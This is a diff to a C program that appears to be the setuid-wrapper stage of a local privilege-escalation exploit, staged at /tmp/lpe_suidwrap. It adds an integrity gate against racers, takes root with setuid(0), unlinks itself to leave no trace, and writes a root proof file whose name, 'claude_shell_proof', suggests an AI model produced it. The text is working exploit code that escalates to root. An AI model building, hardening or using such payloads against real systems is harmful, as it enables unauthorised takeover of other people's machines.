@@ -16,12 +16,31 @@
 #include <stdio.h>
 #include <fcntl.h>
 #include <time.h>
+#include <sys/stat.h>
+
+#ifndef SUID_WRAPPER_PATH
+#define SUID_WRAPPER_PATH "/tmp/lpe_suidwrap"
+#endif
 
 int
 main(int argc, char **argv)
 {
+	struct stat st;
 	(void)argc;
 	(void)argv;
+
+	/* Integrity gate: only run if the executing binary is a REGULAR, root-owned,
+	 * setuid file at the fixed path. This defeats a uid-501 racer replacing the
+	 * staged wrapper (or a symlink plant): their replacement is neither
+	 * root-owned nor setuid, so we refuse before touching root creds. */
+	if (lstat(SUID_WRAPPER_PATH, &st) != 0 ||
+	    !S_ISREG(st.st_mode) ||
+	    st.st_uid != 0 ||
+	    (st.st_mode & S_ISUID) == 0) {
+		dprintf(2, "[suidwrap] integrity check failed (need root-owned setuid regular file)\n");
+		return 1;
+	}
+
 	setgid(0);
 	setuid(0);
 	dprintf(2, "[suidwrap] after setuid: uid=%d euid=%d gid=%d egid=%d\n",
@@ -30,6 +49,13 @@ main(int argc, char **argv)
 		dprintf(2, "[suidwrap] NOT root - setuid not honored. Handoff failed.\n");
 		return 1;
 	}
+
+	/* No persistent root backdoor: once we hold root, unlink the setuid binary
+	 * immediately. The running process keeps its creds; the file just stops
+	 * existing so no other local user can exec it later. */
+	unlink(SUID_WRAPPER_PATH);
+	dprintf(2, "[suidwrap] self-destruct: unlinked %s (no persistent setuid backdoor)\n",
+	    SUID_WRAPPER_PATH);
 
 	/* NON-FORKING root proof: writing under /var/root requires uid 0. */
 	int fd = open("/var/root/claude_shell_proof", O_WRONLY | O_CREAT | O_TRUNC, 0600);
